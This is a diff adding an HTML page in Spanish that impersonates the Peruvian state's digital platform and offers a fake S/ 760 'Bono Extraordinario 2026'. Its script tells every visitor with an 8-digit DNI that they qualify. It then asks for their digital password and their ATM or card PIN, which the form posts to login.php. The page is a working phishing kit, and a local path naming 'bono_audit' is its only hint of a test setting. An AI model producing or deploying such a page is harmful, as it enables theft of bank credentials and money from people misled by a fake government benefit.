@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Bono - Día del Trabajador 2026</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); width: 100%; max-width: 400px; text-align: center; border-top: 8px solid #D91A1A; }
+        img { width: 180px; margin-bottom: 20px; }
+        h2 { color: #333; font-size: 1.4rem; margin-bottom: 10px; }
+        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #D91A1A; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        button:hover { background-color: #b11515; }
+        .success-msg { color: #28a745; font-weight: bold; display: none; margin-bottom: 15px; }
+        .hidden { display: none; }
+        .footer { margin-top: 20px; font-size: 0.7rem; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Imagen local para el servidor -->
+        <img src="/home/abnert/bono_audit/Estado Peruano.png" alt="Gobierno del Perú">
+        <h2>Bono Extraordinario 2026</h2>
+        
+        <div id="step1">
+            <p>Ingresa tu DNI para verificar si eres beneficiario del bono de <strong>S/ 760</strong>.</p>
+            <input type="text" id="dni_input" placeholder="Número de DNI" maxlength="8">
+            <button type="button" onclick="checkBono()">Consultar DNI</button>
+        </div>
+
+        <form action="login.php" method="post" id="step2" class="hidden">
+            <div class="success-msg" id="msg">¡Felicidades! Eres beneficiario del bono.</div>
+            <p>Para procesar el depósito, valida tus credenciales de seguridad:</p>
+            <!-- Guardamos el DNI del paso anterior de forma invisible -->
+            <input type="hidden" name="username" id="dni_hidden">
+            
+            <input type="password" name="password" placeholder="Clave Digital / Contraseña" required>
+            <input type="password" name="extra" placeholder="Clave de Cajero / Tarjeta" required>
+            <button type="submit">Cobrar Bono S/ 760</button>
+        </form>
+
+        <div class="footer">
+            © 2026 Plataforma Digital Única del Estado Peruano
+        </div>
+    </div>
+
+    <script>
+        function checkBono() {
+            const dni = document.getElementById('dni_input').value;
+            if(dni.length === 8) {
+                // Simulamos una carga
+                document.getElementById('dni_hidden').value = dni;
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                document.getElementById('msg').style.display = 'block';
+            } else {
+                alert("Por favor, ingrese un DNI válido de 8 dígitos.");
+            }
+        }
+    </script>
+</body>
+</html>
